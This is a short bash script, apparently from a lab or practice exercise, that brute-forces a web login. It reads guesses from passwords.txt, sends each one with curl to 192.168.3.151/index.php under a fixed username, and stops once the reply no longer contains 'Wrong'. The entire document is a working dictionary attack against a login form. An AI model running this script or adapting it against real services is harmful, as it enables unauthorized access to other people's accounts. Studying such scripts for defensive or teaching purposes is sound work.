input=passwords.txt

while file= read -r line
do

output=("192.168.3.151/index.php?username=furkan.paligu&password=${line}")

findpass=$(curl -s $output | grep -o "Wrong")

if [[ "${findpass}" == "Wrong" ]]
then
echo "WRONG"
else 
echo "$line"
echo "CORRECT"
break
fi
done < "$input"
